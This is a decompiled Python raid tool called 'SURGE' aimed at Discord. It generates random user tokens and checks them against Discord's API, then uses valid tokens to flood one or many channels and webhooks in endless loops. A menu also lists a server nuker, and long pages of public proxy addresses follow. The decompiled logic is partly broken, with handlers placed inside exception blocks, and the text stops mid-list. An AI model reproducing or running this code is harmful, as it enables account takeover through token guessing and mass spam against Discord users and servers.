# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: surge.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import random
import string
import asyncio
import socket
import discord
import aiohttp
from discord.ext import commands
from aiohttp import ClientSession
from rgbprint import gradient_print, Color
import sys
import hashlib

def display_main_menu(valid_token_count):
    clear_screen()
    desktop_name = socket.gethostname()
    title = f'SURGE by Harit I Raid Tool .gg/2fa I Tokens: {valid_token_count}'
    set_title(title)
    message = f'\nSURGE By Harit. Made for users at Raid Tool .gg/2fa. We are not responsible for damages. Tokens: {valid_token_count}\n                                /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$  /$$$$$$$$\n                               /$$__  $$| $$  | $$| $$__  $$ /$$__  $$| $$_____/\n                              | $$  \\__/| $$  | $$| $$  \\ $$| $$  \\__/| $$      \n                              |  $$$$$$ | $$  | $$| $$$$$$$/| $$ /$$$$| $$$$$   \n                               \\____  $$| $$  | $$| $$__  $$| $$|_  $$| $$__/   \n                               /$$  \\ $$| $$  | $$| $$  \\ $$| $$  \\ $$| $$      \n                              |  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$$\n                               \\______/  \\______/ |__/  |__/ \\______/ |________/            \n                  \t   Welcome {desktop_name} to SURGE. Educational uses only ;)\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n[1] Token Generator                      [4] Multi-Channel Raider                   [7] Proxies. Amount: 297 in stock\n[2] Token Checker                        [5] Fetch Server Info                      [8] Webhook Raider\n[3] Single Channel Raider                [6] Fetch User Info                        [9] Server Nuker\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n\n    '
    gradient_print(message, start_color=Color.dark_blue, end_color=Color.light_blue)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def set_title(title):
    if os.name == 'nt':
        os.system(f'title {title}')
    else:  # inserted
        os.system(f'echo -ne \"]0;{title}\a\"')

def generate_token():
    prefixes = ['MTI', 'NT']
    prefix = random.choice(prefixes)
    first_part_length = random.randint(24, 26) - len(prefix)
    first_part = prefix + ''.join(random.choices(string.ascii_letters + string.digits, k=first_part_length))
    second_part = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    third_part_length = random.randint(27, 38)
    third_part = ''.join(random.choices(string.ascii_letters + string.digits, k=third_part_length))
    if random.choice([True, False]):
        dash_position = random.randint(0, third_part_length - 1)
        third_part = third_part[:dash_position] + '-' + third_part[dash_position:]
    token = f'{first_part}.{second_part}.{third_part}'
    return token

async def is_valid_token(token, session):
    url = 'https://discord.com/api/v9/users/@me'
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        async with session.get(url, headers=headers) as response:
            pass  # postinserted
    except Exception as e:
            return response.status == 200
            print(f'Request failed: {e}')
            return False

async def validate_tokens(token_file_path):
    valid_tokens = []
    async with ClientSession() as session:
        with open(token_file_path, 'r') as file:
            tokens = [line.strip() for line in file.readlines()]
        tasks = [is_valid_token(token, session) for token in tokens]
        results = await asyncio.gather(*tasks)
        valid_tokens = [token for token, is_valid in zip(tokens, results) if is_valid]
        return valid_tokens

async def display_token_status(token, is_valid):
    gradient_print(f'[:D] Token is valid: {token}', start_color=Color.green, end_color=Color.white) if is_valid else gradient_print(f'[!] Token is invalid: {token}', start_color=Color.red, end_color=Color.white)

async def generate_and_check_tokens():
    async with ClientSession() as session:
        while True:
            token = generate_token()
            is_valid = await is_valid_token(token, session)
            await display_token_status(token, is_valid)
            await asyncio.sleep(0.1)
    return

async def send_message_with_tokens(valid_tokens, channel_id, message):
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'

    async def send_message(token, session):
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        data = {'content': message}
        try:
            async with session.post(url, headers=headers, json=data) as response:
                pass  # postinserted
        except Exception as e:
                if response.status!= 200:
                    print(f'Failed to send message with token {token[:10]}... (status code: {response.status})')
                print(f'Request failed with token {token[:10]}...: {e}')
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_message(token, session) for token in valid_tokens]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)

async def send_message_to_multiple_channels(valid_tokens, channel_ids, message):
    urls = [f'https://discord.com/api/v9/channels/{channel_id}/messages' for channel_id in channel_ids]

    async def send_message(token, session, url):
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        data = {'content': message}
        try:
            async with session.post(url, headers=headers, json=data) as response:
                pass  # postinserted
        except Exception as e:
                if response.status!= 200:
                    print(f'Failed to send message with token {token[:10]}... to {url} (status code: {response.status})')
                print(f'Request failed with token {token[:10]}... to {url}: {e}')
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_message(token, session, url) for token in valid_tokens for url in urls]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)

async def fetch_server_info(token, server_id):
    url = f'https://discord.com/api/v9/guilds/{server_id}'
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    async with ClientSession() as session:
        try:
            async with session.get(url, headers=headers) as response:
                pass  # postinserted
        except Exception as e:
                if response.status == 200:
                    server_info = await response.json()
                    print('Server Info:')
                    print(f"Name: {server_info['name']}")
                    print(f"ID: {server_info['id']}")
                    print(f"Region: {server_info['region']}")
                    print(f"Member Count: {server_info['approximate_member_count']}")
                    print(f"Verification Level: {server_info['verification_level']}")
                else:  # inserted
                    print(f'Failed to fetch server info. Status code: {response.status}')
    await asyncio.sleep(5)
    print(f'Request failed: {e}')

async def fetch_user_info(token, user_id):
    url = f'https://discord.com/api/v9/users/{user_id}'
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    async with ClientSession() as session:
        try:
            async with session.get(url, headers=headers) as response:
                pass  # postinserted
        except Exception as e:
                if response.status == 200:
                    user_info = await response.json()
                    print('User Info:')
                    print(f"Username: {user_info['username']}")
                    print(f"Discriminator: {user_info['discriminator']}")
                    print(f"ID: {user_info['id']}")
                    print(f"Avatar: {user_info['avatar']}")
                else:  # inserted
                    print(f'Failed to fetch user info. Status code: {response.status}')
    await asyncio.sleep(5)
    print(f'Request failed: {e}')

async def send_message_to_webhook(webhook_url, message):
    async with ClientSession() as session:
        headers = {'Content-Type': 'application/json'}
        data = {'content': message}
        try:
            await session.post(webhook_url, headers=headers, json=data)
        except Exception as e:
            pass  # postinserted
        print(f'Request failed: {e}')

async def handle_webhook_raider(valid_tokens):
    clear_screen()
    webhook_url = input('Enter the webhook URL: ').strip()
    message = input('Enter the message to send: ').strip()
    for token in valid_tokens:
        await send_message_to_webhook(webhook_url, message)
        await asyncio.sleep(0.1)
import os
import asyncio

async def handle_proxies():
    page1 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                        \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://51.89.14.70:80\t\t\thttp://89.145.162.81:3128\t\thttp://72.10.160.90:5265\nhttp://51.89.255.67:80\t\t\thttp://49.13.252.196:80\t\t\thttp://111.225.152.229:8089\nhttp://159.203.61.169:3128\t\tsocks4://138.117.116.30:44009\t\tsocks4://166.0.235.197:39147\nsocks4://171.221.174.230:10800\t\thttp://149.56.148.20:80\t\t\thttp://157.230.188.193:3128\nhttp://67.43.227.226:20913\t\tsocks4://94.40.90.49:5678\t\thttp://122.9.183.228:8000\nhttp://125.77.25.178:8080\t\thttp://72.10.164.178:4107\t\thttp://12.186.205.122:80\nhttp://152.26.231.22:9443\t\thttp://12.186.205.122:80\t\thttp://89.117.152.126:3128\nsocks4://103.191.196.56:1080\t\tsocks4://177.54.147.17:3128\t\thttp://72.10.164.178:21435\nhttp://72.10.160.171:20405\t\thttp://149.28.134.107:2020\t\thttp://176.110.121.90:21776\nhttp://72.10.160.92:8083\t\thttp://72.10.160.170:17955\t\tsocks4://8.211.51.115:8080\nhttp://67.43.227.226:29553\t\thttp://217.13.109.78:80\t\t\thttp://128.199.202.122:3128\nhttp://72.10.160.173:30117\t\thttp://23.247.136.245:80\t\thttp://89.35.237.187:5678\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n    '
    page2 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                      \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://51.89.14.70:80              \thttp://72.10.164.178:4107        \thttp://72.10.164.178:21435\nhttp://89.145.162.81:3128          \thttp://152.26.231.22:9443        \thttp://72.10.160.171:20405\nhttp://51.89.255.67:80             \thttp://72.10.160.90:5265         \thttp://149.28.134.107:2020\nhttp://49.13.252.196:80            \thttp://111.225.152.229:8089      \thttp://176.110.121.90:21776\nhttp://159.203.61.169:3128         \tsocks4://166.0.235.197:39147     \thttp://72.10.160.92:8083\nsocks4://138.117.116.30:44009      \thttp://157.230.188.193:3128      \thttp://72.10.160.170:17955\nsocks4://171.221.174.230:10800     \thttp://122.9.183.228:8000        \thttp://67.43.227.226:29553\nhttp://149.56.148.20:80            \thttp://12.186.205.122:80         \thttp://217.13.109.78:80\nhttp://67.43.227.226:20913         \thttp://89.117.152.126:3128       \tsocks4://8.211.51.115:8080\nsocks4://94.40.90.49:5678          \tsocks4://103.191.196.56:1080     \thttp://128.199.202.122:3128\nhttp://125.77.25.178:8080          \tsocks4://177.54.147.17:3128      \thttp://72.10.160.173:30117\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    page3 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                   \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://23.247.136.245:80           \tsocks4://83.234.147.166:6363      \thttp://67.43.227.227:13107\nhttp://89.35.237.187:5678          \thttp://185.164.136.123:80         \thttp://67.43.227.227:21821\nsocks4://162.241.204.101:48643     \thttp://125.77.25.177:8080         \thttp://67.43.227.226:20577\nsocks4://137.59.7.104:5648         \thttp://67.43.228.253:30591        \thttp://64.23.223.154:80\nhttp://212.107.28.120:80           \thttp://115.223.11.212:8103        \thttp://220.248.70.237:9002\nsocks4://148.72.210.123:7749       \thttp://13.83.94.137:3128          \thttp://72.10.164.178:23521\nhttp://152.26.231.86:9443          \thttp://216.10.247.145:3128        \tsocks4://142.54.226.214:4145\nhttp://103.127.1.130:80            \tsocks4://116.118.98.26:5678       \thttp://47.89.184.18:3128\nsocks4://149.129.255.179:9098      \tsocks4://199.229.254.129:4145     \thttp://72.10.160.170:21157\nhttp://72.10.164.178:32733         \thttp://103.153.154.6:80           \tsocks4://8.211.51.115:8008\nhttp://72.10.160.90:31055          \thttp://178.250.88.254:80          \thttp://72.10.160.171:31147\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    page4 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                    \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://223.113.80.158:9091      \thttp://103.49.202.252:80         \tsocks4://123.57.1.16:5555\nhttp://89.35.237.187:8080       \thttp://152.26.231.42:9443        \tsocks4://141.101.120.210:80\nhttp://72.10.164.178:17131      \tsocks4://200.125.44.242:4145     \tsocks4://47.89.159.212:8081\nhttp://103.162.63.198:8181      \thttp://43.132.124.11:3128        \thttp://67.43.227.229:20597\nhttp://128.199.202.122:8080     \tsocks4://200.55.3.124:999        \thttp://12.186.205.120:80\nhttp://47.91.104.88:3128        \thttp://72.10.160.90:27933        \thttp://47.88.31.196:8080\nhttp://116.114.20.148:3128      \thttp://72.10.160.174:3169        \thttp://191.101.78.207:3128\nhttp://103.159.46.41:83         \tsocks5://8.220.204.215:9098      \thttp://115.223.11.212:50000\nhttp://67.43.228.253:1253       \tsocks4://47.89.159.212:8443      \thttp://139.255.33.242:3128\nhttp://111.225.153.14:8089      \thttp://111.225.153.18:8089       \thttp://191.243.46.2:18283\nhttp://67.43.236.20:4305        \thttp://201.149.100.32:8085       \thttp://67.43.227.227:28717\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    page5 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                    \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://67.43.227.227:8187        \thttp://47.74.40.128:7788        \thttp://72.10.164.178:9833\nhttp://160.86.242.23:8080        \thttp://183.36.24.13:3128        \thttp://194.5.25.34:443\nhttp://72.10.164.178:29389       \thttp://67.43.228.253:16241      \thttp://124.104.145.185:3128\nhttp://135.181.154.225:80        \tsocks4://47.121.182.88:8008     \thttp://67.43.236.20:14255\nsocks4://27.72.139.10:5657       \tsocks4://27.79.82.62:15166      \thttp://212.112.113.178:3128\nsocks4://66.29.128.243:48604     \thttp://62.33.53.248:3128        \thttp://102.0.5.152:8080\nhttp://160.248.7.177:80          \thttp://152.26.229.88:9443       \thttp://1.179.217.11:8080\nhttp://72.10.164.178:5915        \tsocks4://47.90.167.27:8081      \thttp://38.156.72.16:8080\nhttp://189.240.60.169:9090       \thttp://103.164.213.78:8088      \thttp://181.212.41.172:999\nhttp://72.10.160.90:21027        \thttp://67.43.236.20:11697       \tsocks4://103.120.202.53:5678\nhttp://72.10.160.90:5429         \thttp://157.100.9.237:999        \thttp://203.202.253.108:5020\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    page6 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                     \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://67.43.236.20:1135          \thttp://109.68.148.37:3128         \thttp://108.181.56.101:3128\nsocks4://148.66.129.172:55827     \thttp://217.52.247.77:1981         \tsocks4://149.129.255.179:3128\nsocks4://213.14.32.73:4153        \thttp://47.251.87.74:8080          \thttp://192.73.244.36:80\nsocks4://74.56.228.180:4145       \thttp://103.234.31.58:8080         \thttp://158.140.169.9:8081\nhttp://67.43.236.20:28779         \thttp://67.43.228.253:28337        \thttp://12.176.231.147:80\nhttp://208.87.243.199:9898        \thttp://177.32.153.62:8080         \thttp://185.232.169.108:4444\nsocks4://8.211.51.115:80          \thttp://183.234.215.11:8443        \thttp://188.166.197.129:3128\nhttp://67.43.228.250:25975        \tsocks4://86.57.179.4:8080         \tsocks4://184.170.249.65:4145\nhttp://137.116.142.82:80          \tsocks4://72.206.181.105:64935     \thttp://72.10.160.171:32923\nhttp://60.199.29.42:8111          \thttp://154.16.146.44:80           \thttp://67.43.228.250:8545\nhttp://165.16.67.238:8080         \thttp://155.94.241.133:3128        \thttp://133.18.234.13:80\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    page7 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                     \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://124.104.149.53:8081     \thttp://47.251.87.74:80            \thttp://67.43.236.19:7407\nhttp://47.74.152.29:8888       \tsocks4://108.175.23.137:13135     \thttp://72.10.160.90:4337\nhttp://161.97.131.23:8899      \thttp://103.83.232.122:80          \tsocks4://199.127.176.139:64312\nhttp://91.229.28.105:3128      \thttp://203.111.253.40:8080        \tsocks4://47.21.116.165:8080\nhttp://103.157.58.186:8080     \tsocks4://8.137.13.191:9999        \thttp://119.18.149.147:5020\nhttp://64.227.134.208:80       \thttp://195.26.252.23:3128         \thttp://72.10.160.90:23343\nhttp://195.114.209.50:80       \thttp://1.2.220.29:8080            \tsocks4://103.134.38.89:5678\nhttp://45.124.87.19:3128       \thttp://99.8.168.181:32770         \thttp://103.165.157.167:8080\nhttp://67.43.236.20:2461       \thttp://61.129.2.212:8080          \thttp://82.200.80.118:8080\nhttp://95.164.113.107:80       \thttp://205.185.125.235:3128       \thttp://198.49.68.80:80\nhttp://103.184.66.37:8181      \thttp://67.43.228.250:6695         \thttp://27.10.100.192:8118\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    page8 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                     \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nsocks5://117.74.65.207:80      \thttp://200.174.198.86:8888       \thttp://183.215.23.242:9091\nhttp://82.102.10.253:80        \thttp://38.183.146.97:8090        \thttp://160.248.7.207:3128\nhttp://217.21.78.18:3128       \thttp://180.94.12.137:8080        \thttp://103.41.32.182:58080\nhttp://181.233.62.9:999        \thttp://115.245.181.54:23500      \thttp://116.68.170.115:8019\nhttp://128.199.193.78:3128     \thttp://97.76.251.138:8080        \thttp://191.102.254.50:8081\nhttp://67.43.227.227:25907     \thttp://35.185.196.38:3128        \thttp://36.88.13.186:3129\nhttp://103.155.166.93:8181     \tsocks4://46.214.153.223:5678     \thttp://201.91.82.155:3128\nhttp://164.52.206.180:80       \thttp://179.1.134.75:999          \thttp://67.43.227.227:12461\nsocks4://162.55.87.48:5566     \thttp://124.105.48.232:8082       \thttp://189.240.60.171:9090\nhttp://67.43.228.254:13537     \thttp://190.94.213.4:999          \thttp://203.89.8.107:80\nhttp://103.93.93.130:8181      \thttp://95.216.140.215:80         \thttp://72.10.164.178:26643\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    page9 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                       \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://223.204.49.15:8080      \thttp://190.211.87.23:999          \thttp://5.32.37.218:8080\nhttp://4.236.183.37:8080       \thttp://37.252.13.248:3128         \tsocks4://8.137.13.191:8443\nhttp://128.199.136.56:3128     \thttp://124.6.155.170:3131         \thttp://123.205.24.244:8382\nhttp://67.43.236.20:4021       \tsocks4://1.15.62.12:5678          \thttp://203.189.96.232:80\nhttp://203.98.76.2:3128        \thttp://83.169.17.201:80           \tsocks4://110.223.7.135:8081\nhttp://189.240.60.164:9090     \tsocks4://103.30.0.249:4145        \thttp://95.217.155.116:3128\nhttp://52.172.55.7:80          \thttp://45.133.75.125:3128         \thttp://103.25.210.141:3319\nhttp://103.178.21.74:8090      